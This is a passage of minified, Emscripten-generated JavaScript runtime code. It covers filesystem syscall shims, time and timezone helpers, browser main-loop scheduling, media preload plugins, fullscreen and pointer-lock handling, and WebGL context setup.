_emscripten_proxy_to_main_thread_js(31,1,path,size,buf);try{return path=SYSCALLS.getStr(path),assert(64===size),GROWABLE_HEAP_I32()[buf+4>>2]=4096,GROWABLE_HEAP_I32()[buf+40>>2]=4096,GROWABLE_HEAP_I32()[buf+8>>2]=1e6,GROWABLE_HEAP_I32()[buf+12>>2]=5e5,GROWABLE_HEAP_I32()[buf+16>>2]=5e5,GROWABLE_HEAP_I32()[buf+20>>2]=FS.nextInode,GROWABLE_HEAP_I32()[buf+24>>2]=1e6,GROWABLE_HEAP_I32()[buf+28>>2]=42,GROWABLE_HEAP_I32()[buf+44>>2]=2,GROWABLE_HEAP_I32()[buf+36>>2]=255,0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_symlink(target,linkpath){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(32,1,target,linkpath);try{return target=SYSCALLS.getStr(target),linkpath=SYSCALLS.getStr(linkpath),FS.symlink(target,linkpath),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_unlinkat(dirfd,path,flags){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(33,1,dirfd,path,flags);try{return path=SYSCALLS.getStr(path),path=SYSCALLS.calculateAt(dirfd,path),0===flags?FS.unlink(path):512===flags?FS.rmdir(path):abort("Invalid flags passed to unlinkat"),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function __dlinit(main_dso_handle){}var dlopenMissingError="To use dlopen, you need enable dynamic linking, see https://github.com/emscripten-core/emscripten/wiki/Linking";function __dlopen_js(filename,flag){abort(dlopenMissingError)}function __dlsym_js(handle,symbol){abort(dlopenMissingError)}function __emscripten_date_now(){return Date.now()}function __emscripten_default_pthread_stack_size(){return 2097152}var nowIsMonotonic=!0,_emscripten_get_now;function __emscripten_get_now_is_monotonic(){return nowIsMonotonic}function executeNotifiedProxyingQueue(queue){Atomics.store(GROWABLE_HEAP_I32(),queue>>2,1),_pthread_self()&&__emscripten_proxy_execute_task_queue(queue),Atomics.compareExchange(GROWABLE_HEAP_I32(),queue>>2,1,0)}function __emscripten_notify_task_queue(targetThreadId,currThreadId,mainThreadId,queue){if(targetThreadId==currThreadId)setTimeout((()=>executeNotifiedProxyingQueue(queue)));else if(ENVIRONMENT_IS_PTHREAD)postMessage({targetThread:targetThreadId,cmd:"processProxyingQueue",queue:queue});else{var worker=PThread.pthreads[targetThreadId];if(!worker)return void err("Cannot send message to thread with ID "+targetThreadId+", unknown thread ID!");worker.postMessage({cmd:"processProxyingQueue",queue:queue})}return 1}function __emscripten_proxied_gl_context_activated_from_main_browser_thread(contextHandle){GLctx=Module.ctx=GL.currentContext=contextHandle,GL.currentContextIsProxied=!0}function __emscripten_set_offscreencanvas_size(target,width,height){return err("emscripten_set_offscreencanvas_size: Build with -sOFFSCREENCANVAS_SUPPORT=1 to enable transferring canvases to pthreads."),-1}function __emscripten_throw_longjmp(){throw 1/0}function readI53FromI64(ptr){return GROWABLE_HEAP_U32()[ptr>>2]+4294967296*GROWABLE_HEAP_I32()[ptr+4>>2]}function __gmtime_js(time,tmPtr){var date=new Date(1e3*readI53FromI64(time));GROWABLE_HEAP_I32()[tmPtr>>2]=date.getUTCSeconds(),GROWABLE_HEAP_I32()[tmPtr+4>>2]=date.getUTCMinutes(),GROWABLE_HEAP_I32()[tmPtr+8>>2]=date.getUTCHours(),GROWABLE_HEAP_I32()[tmPtr+12>>2]=date.getUTCDate(),GROWABLE_HEAP_I32()[tmPtr+16>>2]=date.getUTCMonth(),GROWABLE_HEAP_I32()[tmPtr+20>>2]=date.getUTCFullYear()-1900,GROWABLE_HEAP_I32()[tmPtr+24>>2]=date.getUTCDay();var start=Date.UTC(date.getUTCFullYear(),0,1,0,0,0,0),yday=(date.getTime()-start)/864e5|0;GROWABLE_HEAP_I32()[tmPtr+28>>2]=yday}function __localtime_js(time,tmPtr){var date=new Date(1e3*readI53FromI64(time));GROWABLE_HEAP_I32()[tmPtr>>2]=date.getSeconds(),GROWABLE_HEAP_I32()[tmPtr+4>>2]=date.getMinutes(),GROWABLE_HEAP_I32()[tmPtr+8>>2]=date.getHours(),GROWABLE_HEAP_I32()[tmPtr+12>>2]=date.getDate(),GROWABLE_HEAP_I32()[tmPtr+16>>2]=date.getMonth(),GROWABLE_HEAP_I32()[tmPtr+20>>2]=date.getFullYear()-1900,GROWABLE_HEAP_I32()[tmPtr+24>>2]=date.getDay();var start=new Date(date.getFullYear(),0,1),yday=(date.getTime()-start.getTime())/864e5|0;GROWABLE_HEAP_I32()[tmPtr+28>>2]=yday,GROWABLE_HEAP_I32()[tmPtr+36>>2]=-60*date.getTimezoneOffset();var summerOffset=new Date(date.getFullYear(),6,1).getTimezoneOffset(),winterOffset=start.getTimezoneOffset(),dst=0|(summerOffset!=winterOffset&&date.getTimezoneOffset()==Math.min(winterOffset,summerOffset));GROWABLE_HEAP_I32()[tmPtr+32>>2]=dst}function __mmap_js(len,prot,flags,fd,off,allocated){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(34,1,len,prot,flags,fd,off,allocated);try{var stream=FS.getStream(fd);if(!stream)return-8;var res=FS.mmap(stream,len,off,prot,flags),ptr=res.ptr;return GROWABLE_HEAP_I32()[allocated>>2]=res.allocated,ptr}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function __munmap_js(addr,len,prot,flags,fd,offset){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(35,1,addr,len,prot,flags,fd,offset);try{var stream=FS.getStream(fd);stream&&(2&prot&&SYSCALLS.doMsync(addr,stream,len,flags,offset),FS.munmap(stream))}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function allocateUTF8(str){var size=lengthBytesUTF8(str)+1,ret=_malloc(size);return ret&&stringToUTF8Array(str,GROWABLE_HEAP_I8(),ret,size),ret}function _tzset_impl(timezone,daylight,tzname){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(36,1,timezone,daylight,tzname);var currentYear=(new Date).getFullYear(),winter=new Date(currentYear,0,1),summer=new Date(currentYear,6,1),winterOffset=winter.getTimezoneOffset(),summerOffset=summer.getTimezoneOffset(),stdTimezoneOffset=Math.max(winterOffset,summerOffset);function extractZone(date){var match=date.toTimeString().match(/\(([A-Za-z ]+)\)$/);return match?match[1]:"GMT"}GROWABLE_HEAP_I32()[timezone>>2]=60*stdTimezoneOffset,GROWABLE_HEAP_I32()[daylight>>2]=Number(winterOffset!=summerOffset);var winterName=extractZone(winter),summerName=extractZone(summer),winterNamePtr=allocateUTF8(winterName),summerNamePtr=allocateUTF8(summerName);summerOffset<winterOffset?(GROWABLE_HEAP_U32()[tzname>>2]=winterNamePtr,GROWABLE_HEAP_U32()[tzname+4>>2]=summerNamePtr):(GROWABLE_HEAP_U32()[tzname>>2]=summerNamePtr,GROWABLE_HEAP_U32()[tzname+4>>2]=winterNamePtr)}function __tzset_js(timezone,daylight,tzname){__tzset_js.called||(__tzset_js.called=!0,_tzset_impl(timezone,daylight,tzname))}function _abort(){abort("native code called abort()")}function runtimeKeepalivePush(){runtimeKeepaliveCounter+=1}function _emscripten_set_main_loop_timing(mode,value){if(Browser.mainLoop.timingMode=mode,Browser.mainLoop.timingValue=value,!Browser.mainLoop.func)return err("emscripten_set_main_loop_timing: Cannot set timing mode for main loop since a main loop does not exist! Call emscripten_set_main_loop first to set one up."),1;if(Browser.mainLoop.running||(runtimeKeepalivePush(),Browser.mainLoop.running=!0),0==mode)Browser.mainLoop.scheduler=function Browser_mainLoop_scheduler_setTimeout(){var timeUntilNextTick=0|Math.max(0,Browser.mainLoop.tickStartTime+value-_emscripten_get_now());setTimeout(Browser.mainLoop.runner,timeUntilNextTick)},Browser.mainLoop.method="timeout";else if(1==mode)Browser.mainLoop.scheduler=function Browser_mainLoop_scheduler_rAF(){Browser.requestAnimationFrame(Browser.mainLoop.runner)},Browser.mainLoop.method="rAF";else if(2==mode){if("undefined"==typeof setImmediate){var setImmediates=[];addEventListener("message",(event=>{"setimmediate"!==event.data&&"setimmediate"!==event.data.target||(event.stopPropagation(),setImmediates.shift()())}),!0),setImmediate=function Browser_emulated_setImmediate(func){setImmediates.push(func),ENVIRONMENT_IS_WORKER?(void 0===Module.setImmediates&&(Module.setImmediates=[]),Module.setImmediates.push(func),postMessage({target:"setimmediate"})):postMessage("setimmediate","*")}}Browser.mainLoop.scheduler=function Browser_mainLoop_scheduler_setImmediate(){setImmediate(Browser.mainLoop.runner)},Browser.mainLoop.method="immediate"}return 0}function maybeExit(){if(!keepRuntimeAlive())try{ENVIRONMENT_IS_PTHREAD?__emscripten_thread_exit(EXITSTATUS):_exit(EXITSTATUS)}catch(e){handleException(e)}}function runtimeKeepalivePop(){assert(runtimeKeepaliveCounter>0),runtimeKeepaliveCounter-=1}function setMainLoop(browserIterationFunc,fps,simulateInfiniteLoop,arg,noSetTiming){assert(!Browser.mainLoop.func,"emscripten_set_main_loop: there can only be one main loop function at once: call emscripten_cancel_main_loop to cancel the previous one before setting a new one with different parameters."),Browser.mainLoop.func=browserIterationFunc,Browser.mainLoop.arg=arg;var thisMainLoopId=Browser.mainLoop.currentlyRunningMainloop;function checkIsRunning(){return!(thisMainLoopId<Browser.mainLoop.currentlyRunningMainloop)||(runtimeKeepalivePop(),maybeExit(),!1)}if(Browser.mainLoop.running=!1,Browser.mainLoop.runner=function Browser_mainLoop_runner(){if(!ABORT)if(Browser.mainLoop.queue.length>0){var start=Date.now(),blocker=Browser.mainLoop.queue.shift();if(blocker.func(blocker.arg),Browser.mainLoop.remainingBlockers){var remaining=Browser.mainLoop.remainingBlockers,next=remaining%1==0?remaining-1:Math.floor(remaining);blocker.counted?Browser.mainLoop.remainingBlockers=next:(next+=.5,Browser.mainLoop.remainingBlockers=(8*remaining+next)/9)}if(out('main loop blocker "'+blocker.name+'" took '+(Date.now()-start)+" ms"),Browser.mainLoop.updateStatus(),!checkIsRunning())return;setTimeout(Browser.mainLoop.runner,0)}else checkIsRunning()&&(Browser.mainLoop.currentFrameNumber=Browser.mainLoop.currentFrameNumber+1|0,1==Browser.mainLoop.timingMode&&Browser.mainLoop.timingValue>1&&Browser.mainLoop.currentFrameNumber%Browser.mainLoop.timingValue!=0?Browser.mainLoop.scheduler():(0==Browser.mainLoop.timingMode&&(Browser.mainLoop.tickStartTime=_emscripten_get_now()),"timeout"===Browser.mainLoop.method&&Module.ctx&&(warnOnce("Looks like you are rendering without using requestAnimationFrame for the main loop. You should use 0 for the frame rate in emscripten_set_main_loop in order to use requestAnimationFrame, as that can greatly improve your frame rates!"),Browser.mainLoop.method=""),Browser.mainLoop.runIter(browserIterationFunc),checkStackCookie(),checkIsRunning()&&("object"==typeof SDL&&SDL.audio&&SDL.audio.queueNewAudioData&&SDL.audio.queueNewAudioData(),Browser.mainLoop.scheduler())))},noSetTiming||(fps&&fps>0?_emscripten_set_main_loop_timing(0,1e3/fps):_emscripten_set_main_loop_timing(1,1),Browser.mainLoop.scheduler()),simulateInfiniteLoop)throw"unwind"}function callUserCallback(func){if(runtimeExited||ABORT)err("user callback triggered after runtime exited or application aborted.  Ignoring.");else try{func(),maybeExit()}catch(e){handleException(e)}}function safeSetTimeout(func,timeout){return runtimeKeepalivePush(),setTimeout((function(){runtimeKeepalivePop(),callUserCallback(func)}),timeout)}function warnOnce(text){warnOnce.shown||(warnOnce.shown={}),warnOnce.shown[text]||(warnOnce.shown[text]=1,err(text))}Module.executeNotifiedProxyingQueue=executeNotifiedProxyingQueue,_emscripten_get_now=ENVIRONMENT_IS_PTHREAD?()=>performance.now()-Module.__performance_now_clock_drift:()=>performance.now();var Browser={mainLoop:{running:!1,scheduler:null,method:"",currentlyRunningMainloop:0,func:null,arg:0,timingMode:0,timingValue:0,currentFrameNumber:0,queue:[],pause:function(){Browser.mainLoop.scheduler=null,Browser.mainLoop.currentlyRunningMainloop++},resume:function(){Browser.mainLoop.currentlyRunningMainloop++;var timingMode=Browser.mainLoop.timingMode,timingValue=Browser.mainLoop.timingValue,func=Browser.mainLoop.func;Browser.mainLoop.func=null,setMainLoop(func,0,!1,Browser.mainLoop.arg,!0),_emscripten_set_main_loop_timing(timingMode,timingValue),Browser.mainLoop.scheduler()},updateStatus:function(){if(Module.setStatus){var message=Module.statusMessage||"Please wait...",remaining=Browser.mainLoop.remainingBlockers,expected=Browser.mainLoop.expectedBlockers;remaining?remaining<expected?Module.setStatus(message+" ("+(expected-remaining)+"/"+expected+")"):Module.setStatus(message):Module.setStatus("")}},runIter:function(func){if(!ABORT){if(Module.preMainLoop)if(!1===Module.preMainLoop())return;callUserCallback(func),Module.postMainLoop&&Module.postMainLoop()}}},isFullscreen:!1,pointerLock:!1,moduleContextCreatedCallbacks:[],workers:[],init:function(){if(Module.preloadPlugins||(Module.preloadPlugins=[]),!Browser.initted){Browser.initted=!0;try{new Blob,Browser.hasBlobConstructor=!0}catch(e){Browser.hasBlobConstructor=!1,err("warning: no blob constructor, cannot create blobs with mimetypes")}Browser.BlobBuilder="undefined"!=typeof MozBlobBuilder?MozBlobBuilder:"undefined"!=typeof WebKitBlobBuilder?WebKitBlobBuilder:Browser.hasBlobConstructor?null:err("warning: no BlobBuilder"),Browser.URLObject="undefined"!=typeof window?window.URL?window.URL:window.webkitURL:void 0,Module.noImageDecoding||void 0!==Browser.URLObject||(err("warning: Browser does not support creating object URLs. Built-in browser image decoding will not be available."),Module.noImageDecoding=!0);var imagePlugin={canHandle:function imagePlugin_canHandle(name){return!Module.noImageDecoding&&/\.(jpg|jpeg|png|bmp)$/i.test(name)},handle:function imagePlugin_handle(byteArray,name,onload,onerror){var b=null;if(Browser.hasBlobConstructor)try{(b=new Blob([byteArray],{type:Browser.getMimetype(name)})).size!==byteArray.length&&(b=new Blob([new Uint8Array(byteArray).buffer],{type:Browser.getMimetype(name)}))}catch(e){warnOnce("Blob constructor present but fails: "+e+"; falling back to blob builder")}if(!b){var bb=new Browser.BlobBuilder;bb.append(new Uint8Array(byteArray).buffer),b=bb.getBlob()}var url=Browser.URLObject.createObjectURL(b);assert("string"==typeof url,"createObjectURL must return a url as a string");var img=new Image;img.onload=()=>{assert(img.complete,"Image "+name+" could not be decoded");var canvas=document.createElement("canvas");canvas.width=img.width,canvas.height=img.height,canvas.getContext("2d").drawImage(img,0,0),preloadedImages[name]=canvas,Browser.URLObject.revokeObjectURL(url),onload&&onload(byteArray)},img.onerror=event=>{out("Image "+url+" could not be decoded"),onerror&&onerror()},img.src=url}};Module.preloadPlugins.push(imagePlugin);var audioPlugin={canHandle:function audioPlugin_canHandle(name){return!Module.noAudioDecoding&&name.substr(-4)in{".ogg":1,".wav":1,".mp3":1}},handle:function audioPlugin_handle(byteArray,name,onload,onerror){var done=!1;function finish(audio){done||(done=!0,preloadedAudios[name]=audio,onload&&onload(byteArray))}function fail(){done||(done=!0,preloadedAudios[name]=new Audio,onerror&&onerror())}if(!Browser.hasBlobConstructor)return fail();try{var b=new Blob([byteArray],{type:Browser.getMimetype(name)})}catch(e){return fail()}var url=Browser.URLObject.createObjectURL(b);assert("string"==typeof url,"createObjectURL must return a url as a string");var audio=new Audio;audio.addEventListener("canplaythrough",(()=>finish(audio)),!1),audio.onerror=function audio_onerror(event){done||(err("warning: browser could not fully decode audio "+name+", trying slower base64 approach"),audio.src="data:audio/x-"+name.substr(-3)+";base64,"+function encode64(data){for(var BASE="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",ret="",leftchar=0,leftbits=0,i=0;i<data.length;i++)for(leftchar=leftchar<<8|data[i],leftbits+=8;leftbits>=6;){var curr=leftchar>>leftbits-6&63;leftbits-=6,ret+=BASE[curr]}return 2==leftbits?(ret+=BASE[(3&leftchar)<<4],ret+="=="):4==leftbits&&(ret+=BASE[(15&leftchar)<<2],ret+="="),ret}(byteArray),finish(audio))},audio.src=url,safeSetTimeout((function(){finish(audio)}),1e4)}};Module.preloadPlugins.push(audioPlugin);var canvas=Module.canvas;canvas&&(canvas.requestPointerLock=canvas.requestPointerLock||canvas.mozRequestPointerLock||canvas.webkitRequestPointerLock||canvas.msRequestPointerLock||(()=>{}),canvas.exitPointerLock=document.exitPointerLock||document.mozExitPointerLock||document.webkitExitPointerLock||document.msExitPointerLock||(()=>{}),canvas.exitPointerLock=canvas.exitPointerLock.bind(document),document.addEventListener("pointerlockchange",pointerLockChange,!1),document.addEventListener("mozpointerlockchange",pointerLockChange,!1),document.addEventListener("webkitpointerlockchange",pointerLockChange,!1),document.addEventListener("mspointerlockchange",pointerLockChange,!1),Module.elementPointerLock&&canvas.addEventListener("click",(ev=>{!Browser.pointerLock&&Module.canvas.requestPointerLock&&(Module.canvas.requestPointerLock(),ev.preventDefault())}),!1))}function pointerLockChange(){Browser.pointerLock=document.pointerLockElement===Module.canvas||document.mozPointerLockElement===Module.canvas||document.webkitPointerLockElement===Module.canvas||document.msPointerLockElement===Module.canvas}},handledByPreloadPlugin:function(byteArray,fullname,finish,onerror){Browser.init();var handled=!1;return Module.preloadPlugins.forEach((function(plugin){handled||plugin.canHandle(fullname)&&(plugin.handle(byteArray,fullname,finish,onerror),handled=!0)})),handled},createContext:function(canvas,useWebGL,setInModule,webGLContextAttributes){if(useWebGL&&Module.ctx&&canvas==Module.canvas)return Module.ctx;var ctx,contextHandle;if(useWebGL){var contextAttributes={antialias:!1,alpha:!1,majorVersion:"undefined"!=typeof WebGL2RenderingContext?2:1};if(webGLContextAttributes)for(var attribute in webGLContextAttributes)contextAttributes[attribute]=webGLContextAttributes[attribute];void 0!==GL&&(contextHandle=GL.createContext(canvas,contextAttributes))&&(ctx=GL.getContext(contextHandle).GLctx)}else ctx=canvas.getContext("2d");return ctx?(setInModule&&(useWebGL||assert(void 0===GLctx,"cannot set in module if GLctx is used, but we are a non-GL context that would replace it"),Module.ctx=ctx,useWebGL&&GL.makeContextCurrent(contextHandle),Module.useWebGL=useWebGL,Browser.moduleContextCreatedCallbacks.forEach((function(callback){callback()})),Browser.init()),ctx):null},destroyContext:function(canvas,useWebGL,setInModule){},fullscreenHandlersInstalled:!1,lockPointer:void 0,resizeCanvas:void 0,requestFullscreen:function(lockPointer,resizeCanvas){Browser.lockPointer=lockPointer,Browser.resizeCanvas=resizeCanvas,void 0===Browser.lockPointer&&(Browser.lockPointer=!0),void 0===Browser.resizeCanvas&&(Browser.resizeCanvas=!1);var canvas=Module.canvas;function fullscreenChange(){Browser.isFullscreen=!1;var canvasContainer=canvas.parentNode;(document.fullscreenElement||document.mozFullScreenElement||document.msFullscreenElement||document.webkitFullscreenElement||document.webkitCurrentFullScreenElement)===canvasContainer?(canvas.exitFullscreen=Browser.exitFullscreen,Browser.lockPointer&&canvas.requestPointerLock(),Browser.isFullscreen=!0,Browser.resizeCanvas?Browser.setFullscreenCanvasSize():Browser.updateCanvasDimensions(canvas)):(canvasContainer.parentNode.insertBefore(canvas,canvasContainer),canvasContainer.parentNode.removeChild(canvasContainer),Browser.resizeCanvas?Browser.setWindowedCanvasSize():Browser.updateCanvasDimensions(canvas)),Module.onFullScreen&&Module.onFullScreen(Browser.isFullscreen),Module.onFullscreen&&Module.onFullscreen(Browser.isFullscreen)}Browser.fullscreenHandlersInstalled||(Browser.fullscreenHandlersInstalled=!0,document.addEventListener("fullscreenchange",fullscreenChange,!1),document.addEventListener("mozfullscreenchange",fullscreenChange,!1),document.addEventListener("webkitfullscreenchange",fullscreenChange,!1),document.addEventListener("MSFullscreenChange",fullscreenChange,!1));var canvasContainer=document.createElement("div");canvas.parentNode.insertBefore(canvasContainer,canvas),canvasContainer.appendChild(canvas),canvasContainer.requestFullscreen=canvasContainer.requestFullscreen||canvasContainer.mozRequestFullScreen||canvasContainer.msRequestFullscreen||(canvasContainer.webkitRequestFullscreen?()=>canvasContainer.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT):null)||(canvasContainer.webkitRequestFullScreen?()=>canvasContainer.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):null),canvasContainer.requestFullscreen()},requestFullScreen:function(){abort("Module.requestFullScreen has been replaced by Module.requestFullscreen (without a capital S)")},exitFullscreen:function(){return!!Browser.isFullscreen&&((document.exitFullscreen||document.cancelFullScreen||document.mozCancelFullScreen||document.msExitFullscreen||document.webkitCancelFullScreen||function(){}).apply(document,[]),!0)},nextRAF:0,fakeRequestAnimationFrame:function(func){var now=Date.now();if(0===Browser.nextRAF)Browser.nextRAF=now+1e3/60;else for(;now+2>=Browser.nextRAF;)Browser.nextRAF+=1e3/60;var delay=Math.max(Browser.nextRAF-now,0);setTimeout(func,delay)},requestAnimationFrame:function(func){"function"!=typeof requestAnimationFrame?(0,Browser.fakeRequestAnimationFrame)(func):requestAnimationFrame(func)},safeSetTimeout:function(func){return safeSetTimeout(func)},safeRequestAnimationFrame:function(func){return runtimeKeepalivePush(),Browser.requestAnimationFrame((function(){runtimeKeepalivePop(),callUserCallback(func)}))},getMimetype:function(name){return{jpg:"image/jpeg",jpeg:"image/jpeg",png:"image/png",bmp:"image/bmp",ogg:"audio/ogg",wav:"audio/wav",mp3:"audio/mpeg"}[name.substr(name.lastIndexOf(".")+1)]},getUserMedia:function(func){window.getUserMedia||(window.getUserMedia=navigator.getUserMedia||navigator.mozGetUserMedia),window.getUserMedia(func)},getMovementX:function(event){return event.movementX||event.mozMovementX||event.webkitMovementX||0},getMovementY:function(event){return event.movementY||event.mozMovementY||event.webkitMovementY||0},getMouseWheelDelta:function(event){var delta=0;switch(event.type){case"DOMMouseScroll":delta=event.detail/3;break;case"mousewheel":delta=event.wheelDelta/120;break;case"wheel":switch(delta=event.deltaY,event.deltaMode){case 0:delta/=100;break;case 1:delta/=3;break;case 2:delta*=80;break;default:throw"unrecognized mouse wheel delta mode: "+event.deltaMode}break;default:throw"unrecognized mouse wheel event: "+event.type}return delta},mouseX:0,mouseY:0,mouseMovementX:0,mouseMovementY:0,touches:{},lastTouches:{},calculateMouseEvent:function(event){if(Browser.pointerLock)"mousemove"!=event.type&&"mozMovementX"in event?Browser.mouseMovementX=Browser.mouseMovementY=0:(Browser.mouseMovementX=Browser.getMovementX(event),Browser.mouseMovementY=Browser.getMovementY(event)),"undefined"!=typeof SDL?(Browser.mouseX=SDL.mouseX+Browser.mouseMovementX,Browser.mouseY=SDL.mouseY+Browser.mouseMovementY):(Browser.mouseX+=Browser.mouseMovementX,Browser.mouseY+=Browser.mouseMovementY);else{var rect=Module.canvas.getBoundingClientRect(),cw=Module.canvas.width,ch=Module.canvas.height,scrollX=void 0!==window.scrollX?window.scrollX:window.pageXOffset,scrollY=void 0!==window.scrollY?window.scrollY:window.pageYOffset;if(assert(void 0!==scrollX&&void 0!==scrollY,"Unable to retrieve scroll position, mouse positions likely broken."),"touchstart"===event.type||"touchend"===event.type||"touchmove"===event.type){var touch=event.touch;if(void 0===touch)return;var adjustedX=touch.pageX-(scrollX+rect.left),adjustedY=touch.pageY-(scrollY+rect.top),coords={x:adjustedX*=cw/rect.width,y:adjustedY*=ch/rect.height};if("touchstart"===event.type)Browser.lastTouches[touch.identifier]=coords,Browser.touches[touch.identifier]=coords;else if("touchend"===event.type||"touchmove"===event.type){var last=Browser.touches[touch.identifier];last||(last=coords),Browser.lastTouches[touch.identifier]=last,Browser.touches[touch.identifier]=coords}return}var x=event.pageX-(scrollX+rect.left),y=event.pageY-(scrollY+rect.top);x*=cw/rect.width,y*=ch/rect.height,Browser.mouseMovementX=x-Browser.mouseX,Browser.mouseMovementY=y-Browser.mouseY,Browser.mouseX=x,Browser.mouseY=y}},resizeListeners:[],updateResizeListeners:function(){var canvas=Module.canvas;Browser.resizeListeners.forEach((function(listener){listener(canvas.width,canvas.height)}))},setCanvasSize:function(width,height,noUpdates){var canvas=Module.canvas;Browser.updateCanvasDimensions(canvas,width,height),noUpdates||Browser.updateResizeListeners()},windowedWidth:0,windowedHeight:0,setFullscreenCanvasSize:function(){if("undefined"!=typeof SDL){var flags=GROWABLE_HEAP_U32()[SDL.screen>>2];flags|=8388608,GROWABLE_HEAP_I32()[SDL.screen>>2]=flags}Browser.updateCanvasDimensions(Module.canvas),Browser.updateResizeListeners()},setWindowedCanvasSize:function(){if("undefined"!=typeof SDL){var flags=GROWABLE_HEAP_U32()[SDL.screen>>2];flags&=-8388609,GROWABLE_HEAP_I32()[SDL.screen>>2]=flags}Browser.updateCanvasDimensions(Module.canvas),Browser.updateResizeListeners()},updateCanvasDimensions:function(canvas,wNative,hNative){wNative&&hNative?(canvas.widthNative=wNative,canvas.heightNative=hNative):(wNative=canvas.widthNative,hNative=canvas.heightNative);var w=wNative,h=hNative;if(Module.forcedAspectRatio&&Module.forcedAspectRatio>0&&(w/h<Module.forcedAspectRatio?w=Math.round(h*Module.forcedAspectRatio):h=Math.round(w/Module.forcedAspectRatio)),(document.fullscreenElement||document.mozFullScreenElement||document.msFullscreenElement||document.webkitFullscreenElement||document.webkitCurrentFullScreenElement)===canvas.parentNode&&"undefined"!=typeof screen){var factor=Math.min(screen.width/w,screen.height/h);w=Math.round(w*factor),h=Math.round(h*factor)}Browser.resizeCanvas?(canvas.width!=w&&(canvas.width=w),canvas.height!=h&&(canvas.height=h),void 0!==canvas.style&&(canvas.style.removeProperty("width"),canvas.style.removeProperty("height"))):(canvas.width!=wNative&&(canvas.width=wNative),canvas.height!=hNative&&(canvas.height=hNative),void 0!==canvas.style&&(w!=wNative||h!=hNative?(canvas.style.setProperty("width",w+"px","important"),canvas.style.setProperty("height",h+"px","important")):(canvas.style.removeProperty("width"),canvas.style.removeProperty("height"))))}};function _emscripten_cancel_main_loop(){Browser.mainLoop.pause(),Browser.mainLoop.func=null}function _emscripten_check_blocking_allowed(){ENVIRONMENT_IS_WORKER||warnOnce("Blocking on the main thread is very dangerous, see https://emscripten.org/docs/porting/pthreads.html#blocking-on-the-main-browser-thread")}function _emscripten_console_error(str){assert("number"==typeof str),console.error(UTF8ToString(str))}function _emscripten_force_exit(status){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(37,1,status);noExitRuntime=!1,runtimeKeepaliveCounter=0,_exit(status)}function __webgl_enable_ANGLE_instanced_arrays(ctx){var ext=ctx.getExtension("ANGLE_instanced_arrays");if(ext)return ctx.vertexAttribDivisor=function(index,divisor){ext.vertexAttribDivisorANGLE(index,divisor)},ctx.drawArraysInstanced=function(mode,first,count,primcount){ext.drawArraysInstancedANGLE(mode,first,count,primcount)},ctx.drawElementsInstanced=function(mode,count,type,indices,primcount){ext.drawElementsInstancedANGLE(mode,count,type,indices,primcount)},1}function __webgl_enable_OES_vertex_array_object(ctx){var ext=ctx.getExtension("OES_vertex_array_object");if(ext)return ctx.createVertexArray=function(){return ext.createVertexArrayOES()},ctx.deleteVertexArray=function(vao){ext.deleteVertexArrayOES(vao)},ctx.bindVertexArray=function(vao){ext.bindVertexArrayOES(vao)},ctx.isVertexArray=function(vao){return ext.isVertexArrayOES(vao)},1}function __webgl_enable_WEBGL_draw_buffers(ctx){var ext=ctx.getExtension("WEBGL_draw_buffers");if(ext)return ctx.drawBuffers=function(n,bufs){ext.drawBuffersWEBGL(n,bufs)},1}function __webgl_enable_WEBGL_draw_instanced_base_vertex_base_instance(ctx){return!!(ctx.dibvbi=ctx.getExtension("WEBGL_draw_instanced_base_vertex_base_instance"))}function __webgl_enable_WEBGL_multi_draw_instanced_base_vertex_base_instance(ctx){return!!(ctx.mdibvbi=ctx.getExtension("WEBGL_multi_draw_instanced_base_vertex_base_instance"))}function __webgl_enable_WEBGL_multi_draw(ctx){return!!(ctx.multiDrawWebgl=ctx.getExtension("WEBGL_multi_draw"))}var GL={counter:1,buffers:[],programs:[],framebuffers:[],renderbuffers:[],textures:[],shaders:[],vaos:[],contexts:{},offscreenCanvases:{},queries:[],samplers:[],transformFeedbacks:[],syncs:[],stringCache:{},stringiCache:{},unpackAlignment:4,recordError:function recordError(errorCode){GL.lastError||(GL.lastError=errorCode)},getNewId:function(table){for(var ret=GL.counter++,i=table.length;i<ret;i++)table[i]=null;return ret},getSource:function(shader,count,string,length){for(var source="",i=0;i<count;++i){var len=length?GROWABLE_HEAP_I32()[length+4*i>>2]:-1;source+=UTF8ToString(GROWABLE_HEAP_I32()[string+4*i>>2],len<0?void 0:len)}return source},createContext:function(canvas,webGLContextAttributes){webGLContextAttributes.renderViaOffscreenBackBuffer&&(webGLContextAttributes.preserveDrawingBuffer=!0);var ctx=webGLContextAttributes.majorVersion>1?canvas.getContext("webgl2",webGLContextAttributes):canvas.getContext("webgl",webGLContextAttributes);return ctx?GL.registerContext(ctx,webGLContextAttributes):0},enableOffscreenFramebufferAttributes:function(webGLContextAttributes){webGLContextAttributes.renderViaOffscreenBackBuffer=!0,webGLContextAttributes.preserveDrawingBuffer=!0},createOffscreenFramebuffer:function(context){var gl=context.GLctx,fbo=gl.createFramebuffer();if(gl.bindFramebuffer(36160,fbo),context.defaultFbo=fbo,context.defaultFboForbidBlitFramebuffer=!1,gl.getContextAttributes().antialias)context.defaultFboForbidBlitFramebuffer=!0;else{var firefoxMatch=navigator.userAgent.toLowerCase().match(/firefox\/(\d\d)/);if(null!=firefoxMatch){var 